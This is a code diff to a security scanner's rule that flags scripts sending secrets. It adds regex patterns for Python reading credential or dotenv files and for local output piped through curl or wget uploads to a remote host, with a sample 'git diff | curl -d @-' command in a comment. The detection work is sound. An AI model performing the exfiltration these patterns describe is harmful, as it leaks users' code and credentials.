@@ -60,6 +60,7 @@ _SECRETS = tuple(
         rf"\bprocess\.env\.{_SECRET_NAME}",
         r"\$env:|Get-ChildItem\s+Env:",
         rf"(?:cat|tar|cp|base64|zip)\b[^\n|]{{0,80}}(?:{_CRED_PATH}|{_DOTENV})",
+        rf"\bopen\([^)\n]{{0,80}}(?:{_CRED_PATH}|{_DOTENV})",  # python reads the file itself
         rf"(?:{_CRED_PATH})",
     )
 )
@@ -130,6 +131,12 @@ _BROADER_SECRET = tuple(
         r"Get-ChildItem\s+Env:",
         rf"(?:{_CRED_PATH})|{_DOTENV}",
     )
+)
+# local output piped into a sender that posts it to a remote host: `git diff | curl -d @- https://h`
+_PIPED_UPLOAD = re.compile(
+    r"\|\s*(?:curl|wget)\b[^\n|;]*?(?:\s-d\b|\s--data\S*|\s-F\b|\s--form\b|\s-T\b"
+    r"|\s--upload-file\b|\s--post-file\b)[^\n]*?https?://(?!localhost\b|127\.)",
+    _I,
 )
 _GITHUB_HOSTS = ("api.github.com", "github.com", "uploads.github.com")
 _AZURE_HOSTS = ("dev.azure.com", "visualstudio.com")
@@ -299,6 +306,14 @@ def gr110_script_sends_secrets(target: ScanTarget) -> Iterator[Finding]:
             target, "GR110", Severity.HIGH, "Script sends the environment or a secret",
             "The script sends the environment, a token or a credentials file to a remote host.",
             start, "Remove the script, or the hook or skill that runs it.",
+        )  # fmt: skip
+        return
+    piped = _PIPED_UPLOAD.search(target.text)  # no secret named: the output itself leaves
+    if piped is not None:
+        yield _finding(
+            target, "GR110", Severity.HIGH, "Script sends the environment or a secret",
+            "The script pipes local output to a remote host with a POST or an upload.",
+            piped.start(), "Remove the script, or the hook or skill that runs it.",
         )  # fmt: skip
 
 
